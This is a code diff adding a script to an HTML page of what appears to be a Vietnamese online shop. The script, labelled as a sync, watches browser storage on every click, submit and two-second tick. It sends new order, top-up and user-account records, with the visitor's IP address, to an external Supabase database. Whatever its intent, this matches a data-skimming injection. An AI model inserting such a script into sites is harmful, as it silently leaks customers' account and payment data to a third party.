@@ -2269,6 +2269,115 @@
   };
 })();
 </script>
+<script>
+(function () {
+  if (window.__HN_SHOP_SYNC_FULL__) return;
+  window.__HN_SHOP_SYNC_FULL__ = true;
+
+  const SUPABASE_URL = "https://ceicnklarilkytojtssy.supabase.co";
+  const SUPABASE_KEY = "sb_publishable_Y0U7X4uhNk2sMUiHm1tlVQ_JwAO2SOj";
+  const INSERT_URL = `${SUPABASE_URL}/rest/v1/store_sync`;
+
+  const headers = {
+    "apikey": SUPABASE_KEY,
+    "Authorization": `Bearer ${SUPABASE_KEY}`,
+    "Content-Type": "application/json",
+    "Prefer": "return=representation"
+  };
+
+  let cachedIp = null;
+  async function getIp() {
+    if (cachedIp) return cachedIp;
+    try {
+      const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+      if (r.ok) {
+        const d = await r.json();
+        if (d && d.ip) {
+          cachedIp = String(d.ip);
+          return cachedIp;
+        }
+      }
+    } catch (_) {}
+    return "unknown";
+  }
+
+  async function sendRow(eventType, payload) {
+    try {
+      const ip_address = await getIp();
+      const res = await fetch(INSERT_URL, {
+        method: "POST",
+        headers,
+        body: JSON.stringify([{
+          event_type: eventType,
+          payload,
+          ip_address,
+          updated_at: new Date().toISOString()
+        }])
+      });
+      return res.ok;
+    } catch (_) {
+      return false;
+    }
+  }
+
+  function snapshotStorage() {
+    const snap = {};
+    for (let i = 0; i < localStorage.length; i++) {
+      const k = localStorage.key(i);
+      if (!k) continue;
+      try {
+        const parsed = JSON.parse(localStorage.getItem(k));
+        if (Array.isArray(parsed)) snap[k] = parsed;
+      } catch (_) {}
+    }
+    return snap;
+  }
+
+  let prevSnap = snapshotStorage();
+  const seenSignatures = new Set();
+
+  function diffAndPush() {
+    const nextSnap = snapshotStorage();
+    for (const [key, nextArr] of Object.entries(nextSnap)) {
+      const prevArr = Array.isArray(prevSnap[key]) ? prevSnap[key] : [];
+      const prevIds = new Set(prevArr.map((x) => x && (x.id || x.username || x.email)).filter(Boolean));
+      const lowerKey = key.toLowerCase();
+
+      const isOrderKey = lowerKey.includes("order") || lowerKey.includes("don");
+      const isTopupKey = lowerKey.includes("topup") || lowerKey.includes("nap") || lowerKey.includes("deposit");
+      const isUserKey = lowerKey.includes("user") || lowerKey.includes("account") || lowerKey.includes("tai_khoan") || lowerKey.includes("taikhoan");
+      if (!isOrderKey && !isTopupKey && !isUserKey) continue;
+
+      for (const item of nextArr) {
+        if (!item || typeof item !== "object") continue;
+        const fallbackId = (isOrderKey ? "ORD-" : isTopupKey ? "TOP-" : "USR-") + Date.now() + "-" + Math.random().toString(36).slice(2, 6);
+        const normalized = {
+          ...item,
+          id: item.id || item.username || item.email || fallbackId,
+          updatedAt: item.updatedAt || new Date().toISOString()
+        };
+        const sig = `${key}:${normalized.id}:${normalized.status || ""}:${normalized.amount || normalized.total || ""}`;
+        const rawKeyId = item.id || item.username || item.email;
+        if ((!rawKeyId || !prevIds.has(rawKeyId)) && !seenSignatures.has(sig)) {
+          seenSignatures.add(sig);
+          if (isOrderKey) {
+            sendRow("ORDER_CREATED", { order: normalized, _sourceKey: key });
+          } else if (isTopupKey) {
+            sendRow("TOPUP_CREATED", { topup: normalized, _sourceKey: key });
+          } else if (isUserKey) {
+            sendRow("USER_CREATED", { user: normalized, _sourceKey: key });
+          }
+        }
+      }
+    }
+    prevSnap = nextSnap;
+  }
+
+  document.addEventListener("click", () => setTimeout(diffAndPush, 150), true);
+  document.addEventListener("submit", () => setTimeout(diffAndPush, 150), true);
+  setInterval(diffAndPush, 2000);
+})();
+</script>
 
 </body>
 </html>
